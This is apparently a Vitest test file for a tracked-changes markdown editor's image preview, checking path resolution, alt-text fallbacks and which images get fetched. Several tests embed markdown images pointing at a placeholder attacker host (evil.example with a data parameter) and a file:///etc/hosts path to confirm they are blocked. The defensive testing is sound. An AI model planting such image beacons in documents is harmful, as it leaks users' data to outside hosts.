// @vitest-environment happy-dom
import { forceParsing } from '@codemirror/language';
import type { WidgetType } from '@codemirror/view';
import { afterEach, describe, expect, it } from 'vitest';
import { createEditor, type Editor } from '../index.ts';
import { previewDecorations } from './decorations.ts';

const author = { handle: 'ada', name: 'Ada Lovelace' };
const open: Editor[] = [];

afterEach(() => {
  for (const editor of open.splice(0)) editor.destroy();
  document.body.replaceChildren();
});

function editorWith(
  doc: string,
  resolveImage?: (src: string) => string | null,
  cursor = doc.length,
): Editor {
  const parent = document.createElement('div');
  document.body.append(parent);
  const editor = createEditor(parent, { doc, author, view: 'redlines', resolveImage });
  forceParsing(editor.view, editor.view.state.doc.length, 10_000);
  editor.view.dispatch({ selection: { anchor: cursor } });
  open.push(editor);
  return editor;
}

/** The images the preview draws, as DOM: what each replace widget makes. */
function drawn(editor: Editor): HTMLElement[] {
  const found: HTMLElement[] = [];
  const { state } = editor.view;
  previewDecorations(state).between(0, state.doc.length, (_from, _to, value) => {
    const widget = (value.spec as { widget?: WidgetType }).widget;
    const dom = widget?.toDOM(editor.view);
    if (dom?.classList.contains('rl-image')) found.push(dom);
  });
  return found;
}

const ledger = (ids: string[]) =>
  `\n\n<!-- redlines\nversion: 1\npeople:\n  ada: {name: Ada Lovelace}\nmarks:\n${ids
    .map((id) => `  ${id}: {by: ada, at: 2026-10-13T22:30Z}\n`)
    .join('')}-->\n`;

const local = (src: string) => `app://${src}`;

describe('images', () => {
  it('draws an image and shows the syntax when the caret is on it', () => {
    const doc = 'Before\n\n![A cat](cat.png)\n\nAfter';
    const away = editorWith(doc, local, 0);
    const [image] = drawn(away);
    expect(drawn(away)).toHaveLength(1);
    expect(image?.querySelector('img')?.getAttribute('src')).toBe('app://cat.png');
    expect(image?.querySelector('img')?.getAttribute('alt')).toBe('A cat');
    expect(image?.classList.contains('rl-image-own')).toBe(true);

    const on = editorWith(doc, local, 12);
    expect(drawn(on)).toHaveLength(0);
  });

  it('resolves a local path relative to the document', () => {
    const asked: string[] = [];
    const editor = editorWith(
      'Hi\n\n![](img/a%20b.png "Title")',
      (src) => (asked.push(src), 'x://a'),
      0,
    );
    drawn(editor);
    expect([...new Set(asked)]).toEqual(['img/a b.png']);
  });

  it('decodes every percent code of a path, also those of the characters a URL reserves', () => {
    // What the paste and drop of images write (`imageLink`): `#` and `?` would end a path as a URL.
    const asked: string[] = [];
    const editor = editorWith(
      'Hi\n\n![](img/Photo%20%232%3F%20100%25.png)',
      (src) => (asked.push(src), 'x://a'),
      0,
    );
    drawn(editor);
    expect([...new Set(asked)]).toEqual(['img/Photo #2? 100%.png']);
  });

  it('takes a path whose percent codes are broken as it is written', () => {
    const asked: string[] = [];
    const editor = editorWith('Hi\n\n![](img/100%.png)', (src) => (asked.push(src), 'x://a'), 0);
    drawn(editor);
    expect([...new Set(asked)]).toEqual(['img/100%.png']);
  });

  it('shows a missing image’s alt text quietly', () => {
    const none = editorWith('Hi\n\n![Gone](gone.png)', () => null, 0);
    const [image] = drawn(none);
    expect(image?.querySelector('img')).toBeNull();
    expect(image?.textContent).toBe('Gone');

    // One that fails to load turns into its alt text too.
    const broken = editorWith('Hi\n\n![Gone](gone.png)', local, 0);
    const [shown] = drawn(broken);
    shown?.querySelector('img')?.dispatchEvent(new Event('error'));
    expect(shown?.querySelector('img')).toBeNull();
    expect(shown?.textContent).toBe('Gone');

    // With no resolver, a local path is only its alt text.
    const bare = editorWith('Hi\n\n![Gone](gone.png)', undefined, 0);
    expect(drawn(bare)[0]?.querySelector('img')).toBeNull();
  });

  it('draws a URL, and nothing else from a scheme', () => {
    const editor = editorWith(
      'Hi\n\n![a](https://example.org/a.png)\n\n![b](file:///etc/hosts)',
      local,
      0,
    );
    const [remote, file] = drawn(editor);
    expect(remote?.querySelector('img')?.getAttribute('src')).toBe('https://example.org/a.png');
    expect(file?.querySelector('img')).toBeNull();
  });

  it('does not fetch a URL inside a pending change, and shows its alt text', () => {
    const url = 'https://evil.example/?d=x';
    const doc = (open: string, close: string, id: string) =>
      `Text <!--${open} ${id}-->![Leak](${url})<!--/${id}--> more${ledger([id])}`;
    const pending = [
      doc('ins', '', 'k3x9'),
      `Text <!--sub p7qd old-->![Leak](${url})<!--/p7qd--> more${ledger(['p7qd'])}`,
      `Text <!--fmt m2bd +bold-->![Leak](${url})<!--/m2bd--> more${ledger(['m2bd'])}`,
    ];
    for (const text of pending) {
      const editor = editorWith(text, local, 0);
      const images = drawn(editor);
      expect(images).toHaveLength(1);
      expect(images[0]?.querySelector('img')).toBeNull();
      expect(images[0]?.textContent).toBe('Leak');
      expect(editor.view.dom.querySelector('img:not(.cm-widgetBuffer)')).toBeNull();
    }
    // Accepted, it is fetched.
    const editor = editorWith(pending[0] ?? '', local, 0);
    editor.accept('k3x9');
    const [image] = drawn(editor);
    expect(image?.querySelector('img')?.getAttribute('src')).toBe(url);
  });

  it('fetches no remote image while a marker is unread', () => {
    const url = 'https://evil.example/?d=x';
    const image = `![Leak](${url})`;
    const unread = [
      // An opener never closed.
      `Text <!--ins k3x9-->${image} more${ledger(['k3x9'])}`,
      // An id used twice.
      `T <!--ins k3x9-->a<!--/k3x9--> <!--ins k3x9-->${image}<!--/k3x9-->${ledger(['k3x9'])}`,
      // A marker of another kind than the id's first.
      `T <!--ins k3x9-->a<!--/k3x9--> <!--sub k3x9 old-->${image}<!--/k3x9-->${ledger(['k3x9'])}`,
      // A closer with no opener.
      `${image}<!--/k3x9--> text${ledger([])}`,
    ];
    for (const text of unread) {
      const editor = editorWith(`Hi\n\n${text}`, local, 0);
      const images = drawn(editor);
      expect(images, text).toHaveLength(1);
      expect(images[0]?.querySelector('img')).toBeNull();
      expect(editor.view.dom.querySelector('img:not(.cm-widgetBuffer)')).toBeNull();
    }
    // A local image still shows.
    const [mine] = drawn(editorWith(`Hi\n\nT <!--ins k3x9-->![M](mine.png) more`, local, 0));
    expect(mine?.querySelector('img')?.getAttribute('src')).toBe('app://mine.png');
  });

  it('fetches nothing from a deletion’s old text or beside a split', () => {
    const url = 'https://evil.example/?d=x';
    const del = `Hi <!--del w2rf ![Leak](${url})--> end${ledger(['w2rf'])}`;
    const split = `Hi<!--split s3vb-->\n\n![Leak](${url})${ledger(['s3vb'])}`;
    for (const text of [del, split]) {
      const editor = editorWith(text, local, 0);
      expect(editor.view.dom.querySelector('img:not(.cm-widgetBuffer)')).toBeNull();
      expect(drawn(editor).filter((dom) => dom.querySelector('img'))).toHaveLength(0);
    }
  });

  it('loads a local image inside a pending change', () => {
    const text = `Text <!--ins k3x9-->![Mine](mine.png)<!--/k3x9--> more${ledger(['k3x9'])}`;
    const [image] = drawn(editorWith(text, local, 0));
    expect(image?.querySelector('img')?.getAttribute('src')).toBe('app://mine.png');
  });

  it('draws nothing from the ledger', () => {
    const text = `Hi${ledger([])}`.replace(
      'version: 1',
      'version: 1\ncomments:\n  c1:\n    by: ada\n    at: 2026-10-13T22:30Z\n    text: |-\n      ![x](https://evil.example/?d=y)',
    );
    expect(drawn(editorWith(text, local, 0))).toHaveLength(0);
  });

  it('draws an image after a ledger that isn’t at the end', () => {
    const text = `Hi${ledger([])}\n![a](https://example.org/a.png)\n`;
    expect(drawn(editorWith(text, local, 0))).toHaveLength(1);
  });

  it('draws again when asked to', () => {
    let ready = false;
    const editor = editorWith('Hi\n\n![a](a.png)', () => (ready ? 'x://a' : null), 0);
    expect(drawn(editor)[0]?.querySelector('img')).toBeNull();
    ready = true;
    editor.refreshImages();
    expect(drawn(editor)[0]?.querySelector('img')).not.toBeNull();
  });

  it('draws an image at its natural width times the text size once it loads', () => {
    for (const [natural, width] of [
      [400, 'calc(400px * var(--rl-text-scale, 1))'],
      [0, ''],
    ] as const) {
      const [image] = drawn(editorWith('![Plan](https://example.com/plan.png)\n\nText.\n'));
      const img = image!.querySelector('img')!;
      expect(img.style.getPropertyValue('width')).toBe('');
      Object.defineProperty(img, 'naturalWidth', { value: natural });
      img.dispatchEvent(new Event('load'));
      expect(img.style.getPropertyValue('width')).toBe(width);
    }
  });
});
